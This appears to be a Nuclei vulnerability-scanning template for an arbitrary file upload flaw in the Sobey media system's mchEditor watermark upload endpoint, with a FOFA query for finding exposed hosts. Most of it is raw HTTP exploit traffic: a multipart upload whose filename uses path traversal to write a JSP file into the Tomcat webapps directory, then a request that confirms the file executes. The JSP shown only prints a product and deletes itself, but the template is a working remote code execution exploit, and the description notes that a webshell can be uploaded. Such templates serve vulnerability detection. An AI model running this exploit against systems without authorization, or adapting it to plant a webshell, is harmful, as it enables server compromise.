id: sobey-mchEditor-file-upload

info:
  name: 索贝融媒体系统 sobey-mchEditor 任意文件上传漏洞
  author: onewin
  severity: critical
  description: |
    索贝融媒体系统的/sobey-mchEditor/watermark/upload接口存在路径遍历文件上传漏洞，可上传JSP Webshell
    [漏洞发现时间：2025年7月]
  metadata:
    fofa-query: 'header="Sobey" || body="/Sc-TaskMonitoring/"'
  tags: 索贝融媒体资产管理系统
variables:
  filename: '{{rand_base(6)}}'
flow: http(1) && http(2)
http:
  - raw:
      - |
        POST /sobey-mchEditor/watermark/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ----WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/{{filename}}.jsp"
        Content-Type: image/jpeg

        <% out.println(111*222);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ----WebKitFormBoundary7MA4YWxkTrZu0gW--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "status"
        part: body
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /sobey-mchEditor/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "24642"  # 111*222的计算结果
        part: body
      - type: status
        status:
          - 200